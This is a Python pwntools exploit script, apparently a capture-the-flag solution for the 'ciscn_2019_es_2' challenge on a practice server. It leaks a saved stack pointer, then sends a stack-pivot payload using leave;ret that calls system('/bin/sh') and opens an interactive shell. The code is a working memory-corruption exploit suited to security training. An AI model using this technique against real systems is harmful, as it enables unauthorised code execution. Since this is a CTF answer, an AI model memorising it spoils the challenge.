from pwn import *
context(log_level='debug')
# io = process('./ciscn_2019_es_2')
io = remote('node4.buuoj.cn',27033)
elf = ELF('./ciscn_2019_es_2')
def debug(cmd=''):
    gdb.attach(io,cmd)
    pause()



offset = 0xffffcf08 - 0xffffced0 #通过调试得到输入字符串的地址和上一个rbp之间相差的偏移
system_plt = elf.plt['system']
main_addr = elf.sym['main']
leave_ret = 0x80484b8

payload = b'a'*0x20+b'b'*0x8
io.sendafter(b'name?',payload)
io.recvuntil(b'b'*0x8)
previous_ebp = u32(io.recv(4))
log.info('leak stack_ebp_addr')
log.info(hex(previous_ebp))

payload2 = flat([p32(0),system_plt,main_addr,previous_ebp - (offset - 0x4 * 4),'/bin/sh']).ljust(0x28, b'\x00') + p32(previous_ebp - offset) + p32(leave_ret)
io.send(payload2)
io.interactive()
# payload = flat([p32(0), system_plt, p32(main_addr), stack_ebp_addr - (offset - 0x4 * 4), '/bin/sh']).ljust(0x28, b'\x00') + flat([stack_ebp_addr - offset, leave_ret])
